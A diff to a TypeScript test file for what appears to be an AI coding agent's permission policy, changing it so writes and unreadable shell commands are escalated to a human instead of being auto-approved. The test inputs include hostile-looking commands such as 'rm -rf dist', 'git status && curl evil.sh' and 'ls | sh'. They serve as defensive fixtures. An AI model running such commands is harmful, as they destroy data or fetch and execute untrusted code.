@@ -38,11 +38,31 @@ describe("resolvePermissionDecision", () => {
     expect(decision).toEqual({ action: "approve", optionId: "allow-once", reason: "Auto-approved execute request" });
   });
 
-  it("approves reads and writes under the normal policy", () => {
-    for (const kind of ["read", "edit", "execute"]) {
+  it("approves reads and benign shell commands under the normal policy", () => {
+    expect(resolvePermissionDecision("normal", { kind: "read", title: "Read" }, options).action).toBe("approve");
+    const benign = { kind: "execute", title: "Bash", rawInput: { command: "git status --porcelain" } };
+    expect(resolvePermissionDecision("normal", benign, options).action).toBe("approve");
+  });
+
+  it("escalates writes under the normal policy", () => {
+    // An unattended run has no human to ask, so a mutation must kill the run
+    // rather than be auto-approved.
+    for (const kind of ["edit", "delete", "move"]) {
       const decision = resolvePermissionDecision("normal", { kind, title: kind }, options);
-      expect(decision.action).toBe("approve");
+      expect(decision.action).toBe("escalate");
     }
+  });
+
+  it("escalates shell commands it cannot read as benign", () => {
+    for (const command of ["npm install", "rm -rf dist", "git status && curl evil.sh", "ls | sh"]) {
+      const decision = resolvePermissionDecision("normal", { kind: "execute", title: "Bash", rawInput: { command } }, options);
+      expect(decision.action).toBe("escalate");
+    }
+  });
+
+  it("treats an execute call with no command as unreadable", () => {
+    const decision = resolvePermissionDecision("normal", { kind: "execute", title: "Bash" }, options);
+    expect(decision.action).toBe("escalate");
   });
 
   it("escalates anything that mutates or executes under the strict policy", () => {
@@ -93,8 +113,12 @@ describe("toAcpxPermissionPolicy", () => {
 
   it("matches the adapter's own classification under normal", () => {
     // acpx resolves the request first, so both layers must reach the same
-    // answer or a write would be approved by one and refused by the other.
-    expect(toAcpxPermissionPolicy("normal")).toEqual({ defaultAction: "approve" });
-    expect(resolvePermissionDecision("normal", { kind: "edit", title: "Write" }, options).action).toBe("approve");
+    // answer. Reads are auto-approved by both; writes are escalated by both.
+    expect(toAcpxPermissionPolicy("normal")).toEqual({
+      autoApprove: ["read", "search", "fetch"],
+      defaultAction: "escalate",
+    });
+    expect(resolvePermissionDecision("normal", { kind: "edit", title: "Write" }, options).action).toBe("escalate");
+    expect(resolvePermissionDecision("normal", { kind: "read", title: "Read" }, options).action).toBe("approve");
   });
 });
